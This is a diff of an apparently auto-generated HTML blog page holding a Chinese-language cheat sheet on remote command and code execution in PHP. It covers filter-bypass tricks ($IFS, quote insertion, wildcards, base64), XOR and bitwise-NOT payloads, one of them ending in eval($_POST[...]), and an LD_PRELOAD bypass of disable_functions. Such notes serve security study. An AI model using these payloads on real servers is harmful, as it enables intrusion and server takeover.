@@ -52,124 +52,50 @@
     <h1>Remote CommandCode Execute RCE 远程命令代码执行</h1>
     <div class="post-meta">
       <time datetime="2026-06-04T02:50:19.000Z">2026.06.04</time>
-      <span>1 分钟阅读</span>
+      <span>3 分钟阅读</span>
     </div>
   </header>
   <div class="article-content">
-    
-# Remote Command/Code Execute RCE 远程命令/代码执行
+    <h1 id="Remote-Command-Code-Execute-RCE-远程命令-代码执行"><a href="#Remote-Command-Code-Execute-RCE-远程命令-代码执行" class="headerlink" title="Remote Command&#x2F;Code Execute RCE 远程命令&#x2F;代码执行"></a>Remote Command&#x2F;Code Execute RCE 远程命令&#x2F;代码执行</h1><h2 id="Remote-Code-Execute-RCE-远程代码执行"><a href="#Remote-Code-Execute-RCE-远程代码执行" class="headerlink" title="Remote Code Execute RCE 远程代码执行"></a>Remote Code Execute RCE 远程代码执行</h2><h3 id="1-形成原因"><a href="#1-形成原因" class="headerlink" title="1.形成原因"></a>1.形成原因</h3><p>应用有时需要调用一些执行系统命令的函数,代码中未对用户可控参数做过滤,当用户能控制这些函数中的参数时,就可以将恶意系统命令拼接到正常命令中,从而造成命令执行攻击</p>
+<p>常见命令执行函数：</p>
+<p>PHP：</p>
+<p>system()，exec()，shell_exec()，passthru()，pcntl_exec()，popen()，proc_open()</p>
+<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><h4 id="2-1反弹shell"><a href="#2-1反弹shell" class="headerlink" title="2.1反弹shell"></a>2.1反弹shell</h4><h3 id="3-绕过方式"><a href="#3-绕过方式" class="headerlink" title="3.绕过方式"></a>3.绕过方式</h3><h4 id="3-1绕过空格"><a href="#3-1绕过空格" class="headerlink" title="3.1绕过空格"></a>3.1绕过空格</h4><p>1.使用$IFS</p>
+<p>cat${IFS}flag</p>
+<p>cat${IFS}$9flag</p>
+<p>cat$IFS$9flag</p>
+<p>2.使用重定向符</p>
+<p>cat&lt;&gt;flag</p>
+<p>cat&lt;flag</p>
+<h4 id="3-2绕过黑名单"><a href="#3-2绕过黑名单" class="headerlink" title="3.2绕过黑名单"></a>3.2绕过黑名单</h4><p>1.字符串拼接</p>
+<p>a&#x3D;c;b&#x3D;at;c&#x3D;flag;$a$b $c</p>
+<p>a&#x3D;g;cat fla$a</p>
+<p>2.编码绕过</p>
+<p>`echo “base64编码后的命令” | base64 -d&#96;</p>
+<p>3.单引号，双引号</p>
+<p>c””at flag</p>
+<p>c””at fl””ag</p>
+<p>c””at fl’’ag</p>
+<p>4.反斜线</p>
+<p>c\at fl\ag</p>
+<p>5.使用通配符</p>
+<p>&#x2F;???&#x2F;??t </p>
+<p>根据路径匹配cat</p>
+<h4 id="3-3绕过长度限制"><a href="#3-3绕过长度限制" class="headerlink" title="3.3绕过长度限制"></a>3.3绕过长度限制</h4><p>使用Linux命令可以换行执行的特性</p>
+<h4 id="3-4无数字字母rce"><a href="#3-4无数字字母rce" class="headerlink" title="3.4无数字字母rce"></a>3.4无数字字母rce</h4><p>是指通过一段不含有数字或字母的payload达到任意代码或者任意命令执行的目的</p>
+<p>核心思路：</p>
+<p>将非字母、数字的字符经过各种变换,最后能构造出a-z中任意一个字符。然后拼接出一个函数名,再利用PHP允许可变函数的特点,能够动态执行函数</p>
+<p>使用异或构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="variable">$_</span>=<span class="string">&quot;&#x27;&amp;#123;&amp;#123;f&quot;</span>^<span class="string">&quot; ?&lt; &gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;$&#125;[_]);&amp;_=assert&amp;_=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cl4y&#x27;</span>]);</span><br></pre></td></tr></table></figure>
 
-## Remote Code Execute RCE 远程代码执行
-
-### 1.形成原因
-
-应用有时需要调用一些执行系统命令的函数,代码中未对用户可控参数做过滤,当用户能控制这些函数中的参数时,就可以将恶意系统命令拼接到正常命令中,从而造成命令执行攻击
-
-常见命令执行函数：
-
-PHP：
-
-system()，exec()，shell_exec()，passthru()，pcntl_exec()，popen()，proc_open()
-
-### 2.漏洞利用
-
-#### 2.1反弹shell
-
-
-
-### 3.绕过方式
-
-#### 3.1绕过空格
-
-1.使用$IFS
-
-cat${IFS}flag
-
-cat${IFS}$9flag
-
-cat$IFS$9flag
-
-2.使用重定向符
-
-cat<>flag
-
-cat<flag
-
-#### 3.2绕过黑名单
-
-1.字符串拼接
-
-a=c;b=at;c=flag;$a$b $c
-
-a=g;cat fla$a
-
-2.编码绕过
-
-\`echo "base64编码后的命令" | base64 -d`
-
-3.单引号，双引号
-
-c""at flag
-
-c""at fl""ag
-
-c""at fl''ag
-
-4.反斜线
-
-c\at fl\ag
-
-5.使用通配符
-
-/???/??t 
-
-根据路径匹配cat
-
-#### 3.3绕过长度限制
-
-使用Linux命令可以换行执行的特性
-
-#### 3.4无数字字母rce
-
-是指通过一段不含有数字或字母的payload达到任意代码或者任意命令执行的目的
-
-核心思路：
-
-将非字母、数字的字符经过各种变换,最后能构造出a-z中任意一个字符。然后拼接出一个函数名,再利用PHP允许可变函数的特点,能够动态执行函数
-
-使用异或构造payload
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="variable">$_</span>=<span class="string">&quot;&#x27;&#123;&#123;f&quot;</span>^<span class="string">&quot; ?&lt; &gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;$&#125;[_]);&amp;_=assert&amp;_=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cl4y&#x27;</span>]);</span><br></pre></td></tr></table></figure>
-
-使用取反构造payload
-
+<p>使用取反构造payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = ~<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%8F%97%8F%96%91%99%90&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-#### 3.5无参数rce
-
-通过一段可以使用函数，但是函数不能调用参数的payload达到任意代码或者任意命令执行的目的
-
-#### 3.6绕过disable_function
-
-利用LD PRELOAD
-·根据文档介绍,如果使用LD_PRELOAD环境变量指定了一个共享库或共享
-对象,那么这个共享对象会在其他对象加载前被加载(优先级最高)
-·php中mail()这个方法会调用底层的getpid()
-·getpid()可以被劫持
-·修改getpid(),会执行系统命令。
-·绕过disable_functions
-
-### 4.漏洞危害
-
-敏感信息泄露
-
-反弹Shell
-
-服务器控制
-
-
-
-
+<h4 id="3-5无参数rce"><a href="#3-5无参数rce" class="headerlink" title="3.5无参数rce"></a>3.5无参数rce</h4><p>通过一段可以使用函数，但是函数不能调用参数的payload达到任意代码或者任意命令执行的目的</p>
+<h4 id="3-6绕过disable-function"><a href="#3-6绕过disable-function" class="headerlink" title="3.6绕过disable_function"></a>3.6绕过disable_function</h4><p>利用LD PRELOAD<br>·根据文档介绍,如果使用LD_PRELOAD环境变量指定了一个共享库或共享<br>对象,那么这个共享对象会在其他对象加载前被加载(优先级最高)<br>·php中mail()这个方法会调用底层的getpid()<br>·getpid()可以被劫持<br>·修改getpid(),会执行系统命令。<br>·绕过disable_functions</p>
+<h3 id="4-漏洞危害"><a href="#4-漏洞危害" class="headerlink" title="4.漏洞危害"></a>4.漏洞危害</h3><p>敏感信息泄露</p>
+<p>反弹Shell</p>
+<p>服务器控制</p>
 
   </div>
 </article>
